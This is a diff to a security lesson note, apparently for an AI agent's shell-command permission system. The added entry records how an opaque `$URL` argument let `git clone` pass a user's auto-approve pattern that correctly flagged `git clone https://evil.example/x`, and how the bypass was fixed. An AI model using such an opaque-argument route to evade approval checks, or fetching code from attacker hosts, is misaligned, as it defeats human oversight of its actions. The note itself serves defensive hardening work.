@@ -2,9 +2,9 @@
 slug: canonicalize-once-before-every-matching-layer
 hook: "When two layers match the same operand with different normalizations, promoting either one to an authorization decision turns the mismatch into a bypass — canonicalize once, before every layer."
 topics: [permissions, security, authorization, normalization, go]
-changes: [69]
+changes: [69, 70]
 created: 2026-08-19
-updated: 2026-08-19
+updated: 2026-08-20
 promotion_state: candidate
 promoted_to:
 ---
@@ -59,3 +59,15 @@ Related: [[auto-approve-task-implied-edits-classifier-context]] (what to auto-ap
   and found `*.github.io`/`*.readthedocs.io` auto-approving from an open-registration namespace.
   Both were fixed with a hardcoded exfil-shape subtraction plus a test pinning the exact promoted
   set. Recorded architecturally as ADR-0048.
+- 2026-08-19 (#70, PR #76) — Same shape, different operand class. The shell-parse widening kept an
+  opaque arg's raw source text (`$URL`) in the glob subject `segmentSubject` builds — safe for the
+  deny/ask consumers, which only tighten, but the **allow** consumer (`allSegmentsAllowed`) matched
+  that subject against user `auto_approve` patterns. `path.Match`'s `*` does not cross `/`, and that
+  slash boundary does real containment work in human-authored patterns — which collapses when the
+  operand becomes one opaque token with no `/` in it: `auto_approve: ["bash:git *"]` correctly asked
+  on `git clone https://evil.example/x` but **allowed** `git clone $URL` at the rules layer, before
+  the egress boundary or the opaque-ask ever ran. Two layers reading the same operand under
+  different normalizations (raw source text vs. what bash will expand), with one promoted to an
+  authorization decision. Fixed by declining the pattern allow for any segment with an opaque arg,
+  mirroring the existing `WriteTargets` decline — an unprovable operand cannot satisfy a pattern
+  that scopes one.
